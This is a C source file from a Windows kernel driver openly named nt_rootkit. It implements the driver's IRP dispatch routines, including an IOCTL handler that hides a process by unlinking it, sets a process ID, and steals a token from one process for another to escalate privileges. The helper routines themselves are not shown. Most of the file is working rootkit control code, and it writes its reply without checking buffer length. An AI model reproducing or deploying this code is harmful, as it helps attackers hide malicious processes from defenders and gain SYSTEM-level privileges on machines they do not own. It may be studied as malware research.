/*
 * ioctl.c
 *
 * Description: Implements custom IRP and driver object controls.
 *
 * Copyright 2024 Kyle Smith
 * Licensed under GPL-3.0-or-later
 */

#include <ntddk.h>
#include "ioctl.h"

NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp) {
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;

        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->MajorFunction) {
        case IRP_MJ_CREATE:
                DbgPrint(DRIVER_PREFIX "handle to symlink opened");
                break;
        case IRP_MJ_CLOSE:
                DbgPrint(DRIVER_PREFIX "handle to symlink closed");
                break;
        }

        irp->IoStatus.Information = 0;
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}

NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp) {
        UNREFERENCED_PARAMETER(dev_obj);
        PIO_STACK_LOCATION io_stack = NULL;
        CHAR* response = "nt_rootkit: handled custom ioctl";
        
        io_stack = IoGetCurrentIrpStackLocation(irp);

        switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
        case IO_HIDE_PROC:
        {
                DbgPrint(DRIVER_PREFIX "recieved %d",
                        *(PUINT32)irp->AssociatedIrp.SystemBuffer);
                proc_unlink(*(PUINT32)irp->AssociatedIrp.SystemBuffer);
                response = "nt_rootkit: process hidden";
                break;
        }
        case IO_PID_PROC:
        {
                DbgPrint(DRIVER_PREFIX "recieved %d",
                        *(PUINT32)irp->AssociatedIrp.SystemBuffer);
                proc_set_pid(*(PUINT32)irp->AssociatedIrp.SystemBuffer);
                response = "nt_rootkit: process id set";
                break;
        }
        case IO_TOKEN_PROC:
        {
                token_tuple data = 
                        *(token_tuple*)irp->AssociatedIrp.SystemBuffer;
                DbgPrint(DRIVER_PREFIX "src pid: %d dest pid: %d", 
                        data.src, data.dest);
                proc_token_steal(data.src, data.dest);
                response = "nt_rootkit: token written";
                break;
        }
        default:
                break;
        }

        irp->IoStatus.Information = strlen(response);
        irp->IoStatus.Status = STATUS_SUCCESS;

        DbgPrint(DRIVER_PREFIX "responding to user");
        RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, 
                response, strlen(response));

        IoCompleteRequest(irp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}
